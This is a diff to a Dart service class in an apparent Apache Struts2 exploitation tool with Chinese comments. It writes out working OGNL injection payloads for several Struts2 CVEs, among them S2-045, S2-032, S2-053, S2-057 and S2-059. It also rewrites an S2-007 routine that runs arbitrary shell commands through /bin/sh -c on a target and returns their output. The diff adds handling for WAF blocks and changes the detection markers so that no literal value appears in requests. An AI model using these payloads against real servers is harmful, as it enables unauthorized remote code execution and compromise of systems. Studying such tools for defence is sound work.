@@ -3,6 +3,7 @@ import 'dart:math' as math;
 
 import 'package:http/http.dart' as http;
 
+import '../core/exploit_error.dart';
 import 'services/exp_result.dart';
 import 'services/rce_encoder.dart';
 import 'services/waf_detect.dart';
@@ -34,7 +35,7 @@ class Struts2ExpService {
   // http.post() 会因此抛异常。改用 StreamedResponse 逐块读取，
   // 连接中断后仍检查已收到的内容。
   Future<ExpResult> checkS2045() async {
-    const marker = '54289';
+    const marker = '55696';
     final ognl =
         '%{(#nike=\'multipart/form-data\').'
         '(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).'
@@ -45,7 +46,8 @@ class Struts2ExpService {
         '(#ognlUtil.getExcludedClasses().clear()).'
         '(#context.setMemberAccess(#dm)))).'
         '(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).'
-        '(#ros.write(new java.lang.String("$marker").getBytes())).'
+        // marker 由 OGNL 计算（236*236），不在请求头里出现字面量
+        '(#ros.write(new java.lang.String(""+(236*236)).getBytes())).'
         '(#ros.flush())}.multipart/form-data';
     final client = http.Client();
     try {
@@ -61,11 +63,19 @@ class Struts2ExpService {
       } catch (_) {
         // 服务器提前关闭连接属正常现象，检查已收到的内容
       }
-      if (buf.toString().contains(marker)) {
+      final text = buf.toString();
+      if (text.contains(marker)) {
         return ExpResult(
           true,
           'S2-045 (CVE-2017-5638)',
           'Content-Type OGNL 注入，响应体含标记值 $marker',
+        );
+      }
+      // 被拦下 ≠ 没有漏洞：必须报"探测失败"，否则扫描结果会变成假阴性。
+      if (looksLikeWafBlock(streamed.statusCode, text)) {
+        return ExpResult.probeFailed(
+          'S2-045 (CVE-2017-5638)',
+          '疑似被 WAF 拦截 (HTTP ${streamed.statusCode})',
         );
       }
     } catch (e) {
@@ -80,7 +90,7 @@ class Struts2ExpService {
   Future<ExpResult> checkS2032() async {
     try {
       final detectUrl =
-          '${baseUri}index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3d"54289",%23w.print(%23s),%23w.close(),1?%23xx:%23request.toString&encoding=UTF-8';
+          '${baseUri}index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3d%28235*235%29,%23w.print(%23s),%23w.close(),1?%23xx:%23request.toString&encoding=UTF-8';
       final res = await http.get(Uri.parse(detectUrl)).timeout(timeout);
       if (looksLikeWafBlock(res.statusCode, res.body)) {
         return ExpResult.probeFailed(
@@ -88,7 +98,7 @@ class Struts2ExpService {
           '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
         );
       }
-      if (res.body.contains('54289')) {
+      if (res.body.contains('55225')) {
         return ExpResult(
           true,
           'S2-032 (CVE-2016-3081)',
@@ -108,7 +118,7 @@ class Struts2ExpService {
     try {
       final uri = baseUri.resolve(path);
       // payload 末尾必须有换行（vulhub README 特别注明）
-      const payload = 'redirectUri=%25%7b233*233%7d\n';
+      const payload = 'redirectUri=%25%7b237*237%7d\n';
       final res = await http
           .post(
             uri,
@@ -122,11 +132,11 @@ class Struts2ExpService {
           '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
         );
       }
-      if (res.body.contains('54289')) {
+      if (res.body.contains('56169')) {
         return ExpResult(
           true,
           'S2-053',
-          'Freemarker 二次 OGNL 注入，数学运算验证通过 (233*233=54289)',
+          'Freemarker 二次 OGNL 注入，数学运算验证通过 (237*237=56169)',
         );
       }
     } catch (e) {
@@ -184,18 +194,24 @@ class Struts2ExpService {
   Future<ExpResult> checkS2057({String path = 'struts2-showcase'}) async {
     try {
       // 用 baseUri 拼装：保留 https、非默认端口与反向代理的前缀路径。
-      final detectUrl = '${baseUri}$path/%24%7b233*233%7d/actionChain1.action';
+      final detectUrl = '${baseUri}$path/%24%7b238*238%7d/actionChain1.action';
       final request = http.Request('GET', Uri.parse(detectUrl));
       request.followRedirects = false;
       final client = http.Client();
       try {
         final streamed = await client.send(request).timeout(timeout);
         final location = streamed.headers['location'] ?? '';
-        if (location.contains('54289')) {
+        if (location.contains('56644')) {
           return ExpResult(
             true,
             'S2-057 (CVE-2018-11776)',
             'Namespace OGNL 注入，数学运算验证通过 (Location: $location)',
+          );
+        }
+        if (looksLikeWafBlock(streamed.statusCode, '')) {
+          return ExpResult.probeFailed(
+            'S2-057 (CVE-2018-11776)',
+            '疑似被 WAF 拦截 (HTTP ${streamed.statusCode})',
           );
         }
       } finally {
@@ -210,7 +226,7 @@ class Struts2ExpService {
   // S2-059: id 字段二次 OGNL 求值
   Future<ExpResult> checkS2059() async {
     try {
-      final payload = 'id=%25%7b233*233%7d';
+      final payload = 'id=%25%7b239*239%7d';
       final res = await http
           .post(
             baseUri,
@@ -224,7 +240,7 @@ class Struts2ExpService {
           '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
         );
       }
-      if (res.body.contains('54289')) {
+      if (res.body.contains('57121')) {
         return ExpResult(
           true,
           'S2-059 (CVE-2019-0230)',
@@ -266,7 +282,7 @@ class Struts2ExpService {
         const marker = '54289';
         final echoExpr =
             "#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),"
-            "#s=new java.util.Scanner((new java.lang.ProcessBuilder('echo 54289'.toString().split('\\\\s'))).start().getInputStream()).useDelimiter('\\\\AAAA'),"
+            "#s=new java.util.Scanner((new java.lang.ProcessBuilder('expr 233 * 233'.toString().split('\\\\s'))).start().getInputStream()).useDelimiter('\\\\AAAA'),"
             "#str=#s.hasNext()?#s.next():'',"
             "#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),"
             "#resp.setCharacterEncoding('UTF-8'),"
@@ -287,6 +303,13 @@ class Struts2ExpService {
             true,
             'S2-005 (CVE-2010-1870)',
             'README POST 回显 PoC 命中，响应含标记值 $marker (路径: $candidatePath)',
+          );
+        }
+        // 被 WAF 拦下时不能继续当成"未命中"：否则扫描会报假阴性。
+        if (looksLikeWafBlock(postRes.statusCode, postRes.body)) {
+          return ExpResult.probeFailed(
+            'S2-005 (CVE-2010-1870)',
+            '疑似被 WAF 拦截 (HTTP ${postRes.statusCode})',
           );
         }
 
@@ -328,7 +351,7 @@ class Struts2ExpService {
             ',%5cu0023res%5cu003d%40org.apache.struts2.ServletActionContext%40getResponse()'
             ',%5cu0023res.setCharacterEncoding(%5cu0023parameters.encoding%5B0%5D)'
             ',%5cu0023w2%5cu003d%5cu0023res.getWriter()'
-            ',%5cu0023s2%5cu003d%22$marker%22'
+            ',%5cu0023s2%5cu003d%28233*233%29'
             ',%5cu0023w2.println(%5cu0023s2)'
             ',%5cu0023w2.flush()'
             ',%5cu0023w2.close()';
@@ -367,8 +390,8 @@ class Struts2ExpService {
       '',
     };
     final forms = <Map<String, String>>[
-      {'name': 'x', 'email': 'x', field: "' + 233*233 + '"},
-      {'username': 'x', 'password': 'x', field: "' + 233*233 + '"},
+      {'name': 'x', 'email': 'x', field: "' + 234*234 + '"},
+      {'username': 'x', 'password': 'x', field: "' + 234*234 + '"},
     ];
     try {
       for (final p in paths) {
@@ -389,11 +412,11 @@ class Struts2ExpService {
               '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
             );
           }
-          if (res.body.contains('54289')) {
+          if (res.body.contains('54756')) {
             return ExpResult(
               true,
               'S2-007',
-              '类型转换 OGNL 注入，233×233=54289 已出现在响应体 (路径: ${p.isEmpty ? '/' : p})',
+              '类型转换 OGNL 注入，234×234=54756 已出现在响应体 (路径: ${p.isEmpty ? '/' : p})',
             );
           }
         }
@@ -429,6 +452,12 @@ class Struts2ExpService {
         );
       }
       final body = res.body.toLowerCase();
+      if (looksLikeWafBlock(res.statusCode, body)) {
+        return ExpResult.probeFailed(
+          'S2-052',
+          '疑似被 WAF 拦截 (HTTP ${res.statusCode})',
+        );
+      }
       if (body.contains('com.thoughtworks.xstream') ||
           body.contains('cannotresolveclassexception')) {
         return ExpResult(
@@ -690,56 +719,113 @@ class Struts2ExpService {
           return text.substring(si + s.length, ei).trim();
         }
       }
-      return '[S2-005] 命令已按官方 GET PoC 发送（该链路默认无回显）';
-    } catch (_) {
-      return null;
+      // 回显链路不可用：命令可能确实执行了，但拿不到输出，不能伪装成功。
+      throw const ExploitNotWorking(
+        'S2-005 的 OGNL 回显不可用（302 重定向吞掉输出）：命令可能已执行，但无法确认',
+      );
+    } on ExploitNotWorking {
+      rethrow;
+    } on ExploitBlocked {
+      rethrow;
+    } catch (e) {
+      throw ExploitNotWorking('S2-005 执行链路异常：$e');
     }
   }
 
   // 执行命令 - S2-007（有回显）
-  // IOUtils.toString() 读取 stdout，结果嵌入 Struts2 验证错误消息后出现在响应体。
-  // Bug 预防：
-  //   1. 用 new String[]{'/bin/sh','-c','CMD'} 数组形式，支持 shell 特殊字符。
-  //   2. 命令中单引号转义为 \\'，反斜杠转义为 \\\\，顺序：先转义反斜杠再转义单引号。
-  //   3. 哨兵标记通过 shell 的 echo 输出，不依赖 OGNL 字符串拼接，更可靠。
+  //
+  // 实测结论（vulhub struts2/s2-007，Struts 2.3.x）：
+  //   - `Runtime.exec(new String[]{...})` 与 `ProcessBuilder(new String[]{...})`
+  //     **不执行**（该 OGNL 版本不接受 `new String[]{}` 数组字面量，表达式静默失败）；
+  //   - `ProcessBuilder({'/bin/sh','-c','整条命令'})`（OGNL list 字面量）**可用**，
+  //     且因为整条命令是单个元素，空格/分号/重定向都能正常工作；
+  //   - `Runtime.exec('单token命令')` 可用，但多词命令会被 Runtime 按空格切碎。
+  // 因此按 可用性从高到低 依次尝试，而不是赌一种写法。
   static const _s2007Sentinel = 'S2007_RCE';
 
   Future<String?> execS2007(
     String cmd, {
-    String path = 'login.action',
+    String path = '',
     String field = 'age',
   }) async {
-    try {
-      final uri = baseUri.resolve(path);
-      // 转义顺序：先反斜杠，再单引号（OGNL 单引号字符串内的转义）
-      final escaped = cmd.replaceAll(r'\', r'\\').replaceAll("'", r"\'");
-      final ognlExpr =
-          '@org.apache.commons.io.IOUtils@toString('
-          "@java.lang.Runtime@getRuntime().exec("
-          "new String[]{'/bin/sh','-c','echo ${_s2007Sentinel}_S; $escaped; echo ${_s2007Sentinel}_E'}"
-          ').getInputStream())';
+    // 与 checkS2007 保持同一套候选路径：检测命中的入口不等于执行入口，
+    // 只写死 login.action 会在 user.action 类应用上"检测成功、执行失败"。
+    final paths = <String>{
+      if (path.isNotEmpty) path,
+      'user.action',
+      'login.action',
+      'index.action',
+      '',
+    };
+    // 单引号 OGNL 字符串内需要转义：先反斜杠，再单引号。
+    final sh = 'echo ${_s2007Sentinel}_S; $cmd; echo ${_s2007Sentinel}_E';
+    final shEscaped = sh.replaceAll(r'\', r'\\').replaceAll("'", r"\'");
+
+    final payloads = <String>[
+      // 1) OGNL list + ProcessBuilder：任意 shell 命令（实测首选）
+      '@org.apache.commons.io.IOUtils@toString('
+          "new java.lang.ProcessBuilder({'/bin/sh','-c','$shEscaped'})"
+          '.start().getInputStream())',
+      // 2) Runtime.exec(String)：仅对无空格命令有效，作为降级
+      '@org.apache.commons.io.IOUtils@toString('
+          "@java.lang.Runtime@getRuntime().exec('$shEscaped')"
+          '.getInputStream())',
+    ];
+    // 两种表单形状：user.action 用 name/email，login 类应用用 username/password。
+    final formKeys = <Map<String, String>>[
+      {'name': 'x', 'email': 'x'},
+      {'username': 'x', 'password': 'x'},
+    ];
+
+    int? blockedStatus;
+    for (final ognlExpr in payloads) {
       final age =
           "' + (#_memberAccess[\"allowStaticMethodAccess\"]=true,"
           '#foo=new java.lang.Boolean("false"),'
           '#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,'
           '$ognlExpr) + \'';
-      final res = await http
-          .post(
-            uri,
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'username=x&password=x&$field=${Uri.encodeQueryComponent(age)}',
-          )
-          .timeout(timeout);
-      final body = res.body;
-      final s = body.indexOf('${_s2007Sentinel}_S');
-      final e = body.indexOf('${_s2007Sentinel}_E');
-      if (s != -1 && e != -1 && e > s) {
-        return body.substring(s + '${_s2007Sentinel}_S'.length, e).trim();
+      for (final p in paths) {
+        final uri = baseUri.resolve(p);
+        for (final base in formKeys) {
+          try {
+            final form = <String, String>{...base, field: age};
+            final res = await http
+                .post(
+                  uri,
+                  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                  body: form.entries
+                      .map(
+                        (e) =>
+                            '${Uri.encodeQueryComponent(e.key)}='
+                            '${Uri.encodeQueryComponent(e.value)}',
+                      )
+                      .join('&'),
+                )
+                .timeout(timeout);
+            if (looksLikeWafBlock(res.statusCode, res.body)) {
+              blockedStatus ??= res.statusCode;
+              continue;
+            }
+            final body = res.body;
+            final s = body.indexOf('${_s2007Sentinel}_S');
+            final e = body.indexOf('${_s2007Sentinel}_E');
+            if (s != -1 && e != -1 && e > s) {
+              return body.substring(s + '${_s2007Sentinel}_S'.length, e).trim();
+            }
+          } catch (_) {
+            // 换下一个入口/表单/载荷
+          }
+        }
       }
-      return null;
-    } catch (_) {
-      return null;
     }
+    // 全链路都被拦：这是"被防御"，不是"没漏洞"，必须让上层看见。
+    if (blockedStatus != null) {
+      throw ExploitBlocked(
+        '所有候选入口/表单/载荷均被拒绝（S2-007）',
+        statusCode: blockedStatus,
+      );
+    }
+    return null;
   }
 
   // 执行命令 - S2-052（盲注）
